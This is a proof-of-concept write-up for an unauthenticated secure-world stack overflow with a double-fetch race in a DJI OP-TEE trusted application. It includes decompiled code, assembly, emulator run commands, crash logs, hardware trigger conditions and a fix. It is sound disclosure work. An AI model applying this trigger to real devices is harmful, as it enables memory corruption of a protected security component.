# PoC — DJI OP-TEE TA `09db16c0` cmd 2 name-field STACK overflow (double-fetch)

Normal-world CA that triggers a **secure-world stack buffer overflow** in command
`2` (`fw_image_verify_load2ion`, `FUN_00100798`) of TA
`09db16c0-873b-4fed-b87e-a5d2b86293a2`.

This is a **different** bug from:
- the cmd-4 verify-ctx `.bss` overflow at `0x103f74` (`09db_fw_verify_update_overflow/`), and
- the (non-vulnerable, single-fetch) chunk-table copy at `0x1039b4`.

## The bug

`FUN_00100798` copies the image **name** field (`image+0x40`) into a **32-byte**
stack buffer using `strlen()` as the length, with **no bound** against the
destination, and the name is read **twice** from CA shared memory:

```c
uVar1 = *(uint *)(image + 0x9c);                 // chunk_count   <- FETCH #1 of +0x9c
if ((param_5 == 0) || (uVar1 < 2)) {
    if (0x10 < uVar1) return -5;                 // the ONLY cap that touches +0x9c
    memcpy(local_228, image + 0xc0, uVar1<<5);   // chunk table (fits, single-fetch)
    len = strlen(image + 0x40);                  // 0x1008c4 reads name (incl. +0x9c)
    memcpy(local_28, image + 0x40, len);         // 0x1008dc SINK: 32-byte dst, len UNBOUNDED
    ...
    image_verifiy_decrypt(...);                  // signature/struct check is AFTER the overflow
}
```

```
1008c4  bl 0x10c21c     ; strlen(image+0x40)  -- FETCH (measure name in shared mem)
1008c8  mov x2, x0      ; len = strlen, NO bound vs the 32-byte dst
1008cc  add x8, x29,#0x278 ; dst = local_28 (32 bytes, then the stack canary)
1008dc  bl 0x10c170     ; memcpy(dst, image+0x40, len)  -- FETCH (copy name again)
```

Two defects:

1. **No bound on the copy length.** `strlen(name)` is copied into a 32-byte
   stack buffer (`local_28`). A name > 32 bytes smashes the stack canary, saved
   registers and caller frame. Reached **before** the signature check
   (`image_verifiy_decrypt`), so it is **unauthenticated**.

2. **Double-fetch of `+0x9c` (the only cap).** Because the name starts at `+0x40`,
   the only thing capping its length at `0x5c` (92) bytes is that a longer name
   forces `image[0x9c] != 0` → `chunk_count` huge → "too many chunks" rejection.
   `+0x9c` is read once as `chunk_count` (FETCH #1) and again while `strlen`
   walks the name across it (FETCH #2). A second CA core that shows
   `image[0x9c]==0` during FETCH #1 (cap passes) and `!=0` before FETCH #2 (name
   keeps going) defeats the cap → **unbounded** copy.

## Reachability / emulator preconditions

cmd 2 needs `paramTypes == 0x1157` and a one-time key derivation. The overflow
is **before** `image_verifiy_decrypt`, so **no signature** is needed. We only
model the always-succeeds-on-HW preconditions the bare emulator can't satisfy
(neither is an attacker gate):

| flag | models |
|------|--------|
| `TAEMU_FORCE_RET0="0x20,0x6af0"` | `TA_KeyDerivation` (0x20, one-time secure-boot key derive) and `invalidate_image_cache` (0x6af0, normal-world cache maintenance) |

## Build & run

```sh
# 1. launch the TA (interactive); the FIRST socket connection is THE session,
#    so do not port-probe it.
cd /srv/emulator
TAEMU_FORCE_RET0="0x20,0x6af0" \
  python3 -u -m emulate --tee optee rootfs/09db16c0-873b-4fed-b87ea5d2b86293a2.ta

# 2. run the CA (separate shell)
cd /srv/optee/pocs/09db_verify_load2ion_name_stackov
python3 poc.py              # deterministic: 92-byte name -> canary smash
python3 poc.py --race 2500  # race the +0x9c double-fetch -> unbounded copy
```

The emulator re-reads the System V shared segment on **every** shared-memory
access, so the flipper thread's writes are observed mid-invoke — this is the
double-fetch test bed. Restart the emulator between runs (a crash/panic ends the
session). On real hardware no flags are needed: invoke cmd 2 with a MEMREF image
whose `+0x40` name is > 32 bytes (and race `+0x9c` from a second thread for the
unbounded variant).

## Observed result (emulator)

**Deterministic** (`poc.py`): 92-byte name (`+0x9c == 0` doubles as the NUL and
`chunk_count == 0`) → `memcpy` 92 bytes into the 32-byte `local_28` → stack
canary smashed → TA wedges in `__stack_chk_fail` (no reply; the PoC reports the
hung invoke).

**Race** (`poc.py --race 2500`): after a stream of clean `-5` rejects (FETCH #1
saw `+0x9c != 0`), invoke 9 won:

```
[+] WON (unbounded) on invoke 9: ret=0xffff0000 after 9 clean rejects
```

Emulator side — the TA's own header dump shows `+0x9c` holding the racer's
`0xff 0xff 0xff 0xff` *after* the chunk-count cap passed with `0`, then a fault
inside `memcpy`:

```
E/TA: hex_dump:30 0x41 0x41 0x41 0xff 0xff 0xff 0xff 0x41   <- +0x9c raced to 0xffffffff
E/TA: fw_image_verify_load2ion:470 failed to verify the image
[x] invalid memory access @ 0xbbbbf000 size=1 pc=0x5555555601dc -- crash   (pc = 0x10c1dc, in memcpy)
[x] [optee] emulation fault during entry: Invalid memory mapping (UC_ERR_MAP)
[=] InvokeCommand returned: 0xffff0000
```

i.e. FETCH #1 of `+0x9c` passed the `<= 16` cap, FETCH #2 walked the extended
(non-NUL) name → unbounded `strlen`/`memcpy` → the 32-byte stack buffer and the
rest of `FUN_00100798`'s frame are overwritten → the corrupted-stack cleanup
path faults inside `memcpy`.

## Fix

Bound the name length against the destination (`min(strlen, sizeof(local_28)-1)`),
copy the header into secure memory once and validate the copy, and read `+0x9c`
a single time into a local reused for both the chunk-count cap and any later use.
